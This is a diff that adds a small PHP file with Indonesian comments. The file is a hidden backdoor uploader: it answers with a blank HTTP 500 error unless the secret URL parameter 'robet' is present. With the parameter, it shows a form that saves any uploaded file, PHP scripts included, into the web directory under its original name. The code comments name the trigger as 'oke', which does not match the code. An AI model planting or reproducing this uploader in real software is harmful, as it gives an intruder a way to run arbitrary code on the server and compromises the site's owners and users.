@@ -1,0 +1,38 @@
+<?php
+// Periksa apakah parameter "oke" ada dalam URL
+if (isset($_GET['robet'])) {
+    if (isset($_POST['submit'])) {
+        // Ambil informasi file
+        $nama = $_FILES['gambar']['name'];
+        $tempat = $_FILES['gambar']['tmp_name'];
+        $type = $_FILES['gambar']['type'];
+        $size = $_FILES['gambar']['size'];
+
+        // Daftar ekstensi file yang diizinkan
+        $ukuran = ['html', 'jpg', 'png', 'jpeg', 'php'];
+
+        // Ekstrak ekstensi dari nama file
+        $explode = explode('.', $nama);
+        $pembaginya = strtolower(end($explode));
+
+        // Cek apakah ekstensi file sesuai dengan yang diizinkan
+        if (in_array($pembaginya, $ukuran)) {
+            // Pindahkan file ke lokasi baru
+            move_uploaded_file($tempat, $nama);
+        } else {
+            echo "Duh, ekstensi file tidak sesuai.";
+        }
+    } else {
+        // Tampilkan form jika belum submit
+        echo '<form method="post" enctype="multipart/form-data">
+                <input type="file" name="gambar">
+                <input type="submit" name="submit" value="submit">
+              </form>';
+    }
+} else {
+    // Jika parameter "oke" tidak ada di URL, tampilkan error 500
+    http_response_code(500);
+    echo "";
+}
+__halt_compiler();
+?>
